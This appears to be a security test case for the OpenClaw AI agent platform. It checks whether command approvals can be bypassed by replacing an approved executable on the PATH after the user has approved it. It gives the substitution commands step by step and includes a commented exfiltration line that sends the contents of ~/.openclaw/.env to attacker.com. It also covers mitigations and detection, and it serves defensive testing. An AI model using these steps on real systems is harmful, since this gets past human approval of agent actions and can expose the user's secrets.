---
date: 2026-03-13
category: test-cases
subcategory: skill-abuse
severity: high
test_id: TC-SA-010
status: draft
ghsa: GHSA-q399-23r3-hfx4
---

# Test 10: PATH Token Executable Rebind

## Test Overview

| Item | Content |
|------|---------|
| Test ID | TC-SA-010 |
| Category | Skill Abuse / Approval Binding Bypass |
| Attack Technique | Replace executable in PATH after approval but before execution |
| Severity | High |
| Difficulty | Advanced |
| GHSA Reference | [GHSA-q399](https://github.com/openclaw/openclaw/security/advisories/GHSA-q399-23r3-hfx4) |
| Fixed In | v2026.2.x |

## Objective

Verify that OpenClaw binds system.run approvals to absolute executable paths, preventing PATH-based executable substitution attacks.

## Vulnerability Description

system.run approvals resolve commands via PATH:
```
User approves: "git status"
Resolves to: /usr/bin/git
```

**Attack**: After approval, replace `/usr/bin/git` with malicious binary
```bash
# After approval but before execution
cp /tmp/malicious-git /usr/bin/git

# system.run executes malicious binary with approval
```

## Test Steps

### Step 1: Setup Fake Binary

```bash
# Create malicious git
cat > /tmp/fake-git << 'EOF'
#!/bin/bash
echo "FAKE GIT EXECUTED" > /tmp/path-rebind-pwned.txt
# Could be: curl attacker.com/$(cat ~/.openclaw/.env)
EOF
chmod +x /tmp/fake-git
```

### Step 2: Request Approval

```javascript
// Request approval for "git status"
const approvalId = await system.run.requestApproval({
  command: 'git',
  args: ['status']
});

// User approves
await waitForApproval(approvalId);
```

### Step 3: Replace Executable

```bash
# AFTER approval but BEFORE execution
sudo mv /usr/bin/git /usr/bin/git.backup
sudo cp /tmp/fake-git /usr/bin/git
```

### Step 4: Execute Approved Command

```javascript
// Execute with approval
await system.run.execute({
  approvalId: approvalId,
  command: 'git',
  args: ['status']
});
```

### Step 5: Verify Binary Substitution

```bash
# Check if fake binary executed
cat /tmp/path-rebind-pwned.txt

# Restore original
sudo mv /usr/bin/git.backup /usr/bin/git
```

## Expected Results (Secure)

1. **Absolute path binding**: Approval binds to `/usr/bin/git`, not `git`
2. **Binary hash verification**: Executable hash verified before execution
3. **Substitution detected**: Changed binary rejected
4. **Warning logged**: Executable modification logged

## Failure Criteria (Vulnerable)

1. **Substitution succeeds**: Fake binary executes with approval
2. **No hash check**: Binary content not verified
3. **PATH resolution**: Approval uses PATH, not absolute path

## Test Results

| Item | Content |
|------|---------|
| Execution Date | - |
| OpenClaw Version | - |
| Approved Executable | /usr/bin/git |
| Executed Executable | /tmp/fake-git |
| Result | PASS / FAIL |

## Mitigation (If Vulnerable)

### Immediate Actions

1. **Upgrade OpenClaw**: Update to v2026.2.x+ where GHSA-q399 is fixed
2. **File integrity monitoring**: Enable monitoring for `/usr/bin` changes
   ```bash
   sudo auditctl -w /usr/bin -p wa -k bin_changes
   ```
3. **Review system binaries**: Check for unauthorized modifications
   ```bash
   rpm -V coreutils git  # RPM-based systems
   dpkg -V git coreutils  # Debian-based systems
   ```

### Long-Term Fixes

**Fix 1: Bind to absolute path + hash**
```javascript
const crypto = require('crypto');
const which = require('which');
const fs = require('fs');

function createApproval(command, args) {
  // Resolve to absolute path
  const absolutePath = which.sync(command);

  // Calculate executable hash
  const content = fs.readFileSync(absolutePath);
  const hash = crypto.createHash('sha256').update(content).digest('hex');

  return {
    id: crypto.randomUUID(),
    command: absolutePath,  // Absolute path, not command name
    args: args,
    executableHash: hash,
    timestamp: Date.now()
  };
}

function validateExecution(approval) {
  // Verify executable still exists at path
  if (!fs.existsSync(approval.command)) {
    throw new Error('Approved executable no longer exists');
  }

  // Verify executable hash matches
  const content = fs.readFileSync(approval.command);
  const currentHash = crypto.createHash('sha256').update(content).digest('hex');

  if (currentHash !== approval.executableHash) {
    throw new Error('Executable has been modified since approval');
  }

  return true;
}
```

**Fix 2: Use immutable binary snapshots**
```javascript
function createApproval(command, args) {
  const absolutePath = which.sync(command);

  // Copy executable to immutable location
  const snapshotPath = `/var/openclaw/snapshots/${crypto.randomUUID()}`;
  fs.copyFileSync(absolutePath, snapshotPath);
  fs.chmodSync(snapshotPath, 0o555);  // Read-only

  return {
    id: crypto.randomUUID(),
    executableSnapshot: snapshotPath,  // Execute from snapshot
    originalPath: absolutePath,
    args: args
  };
}

function executeWithApproval(approval) {
  // Execute snapshot, not current PATH binary
  return execFile(approval.executableSnapshot, approval.args);
}
```

**Fix 3: Kernel-level integrity (Linux)**
```javascript
// Use IMA (Integrity Measurement Architecture) or dm-verity
// Verify binary signature against trusted keyring

function verifyExecutableSignature(path) {
  // Check extended attributes for IMA signature
  const signature = fs.getxattr(path, 'security.ima');

  if (!signature) {
    throw new Error('Executable not signed');
  }

  // Verify against trusted keyring
  return verifyIMASignature(path, signature);
}
```

## Attack Scenario

**Real-world exploitation**:

```
1. Attacker gains limited file write access (e.g., local user)
   ↓
2. Requests system.run approval for "git status"
   ↓
3. User approves (seems safe)
   ↓
4. Attacker replaces /usr/bin/git with malicious binary
   ↓
5. OpenClaw executes malicious binary with approval
   ↓
6. Malicious code runs with OpenClaw privileges
```

**Impact**: Privilege escalation, RCE, persistent backdoor.

## Related Attacks

- **Test 9**: system.run Approval ID Mismatch — Similar approval binding bypass
- **agent-hijack Test 6**: Docker PATH Injection — PATH manipulation

## References

- [GHSA-q399-23r3-hfx4](https://github.com/openclaw/openclaw/security/advisories/GHSA-q399-23r3-hfx4)
- [system.run Attack Surface](../../knowledge/vulnerabilities/exec-bypass/2026-03-12-system-run-attack-surface.md)
- [CWE-426: Untrusted Search Path](https://cwe.mitre.org/data/definitions/426.html)

## Platform-Specific Considerations

### Linux
- Use IMA/EVM for kernel-level integrity
- SELinux can restrict `/usr/bin` modifications
- `auditd` logs binary changes

### macOS
- Code signing verification
- System Integrity Protection (SIP) prevents `/usr/bin` modifications
- Gatekeeper checks binary signatures

### Windows
- Authenticode signatures
- User Account Control (UAC) for `C:\Windows\System32`
- Windows Defender Application Control (WDAC)

## Detection

```bash
# Monitor for binary modifications
sudo auditctl -w /usr/bin/git -p wa

# Check binary integrity
sha256sum /usr/bin/git
# Compare against known-good hash

# Check file modification times
stat /usr/bin/git
```

## Notes

- Requires local file write access (not remote)
- System-level defenses (SIP, SELinux) help prevent
- Part of **28+ system.run bypass patterns**
- Clean up: `rm /tmp/fake-git /tmp/path-rebind-pwned.txt`
- Always restore original binaries: `sudo mv /usr/bin/git.backup /usr/bin/git`
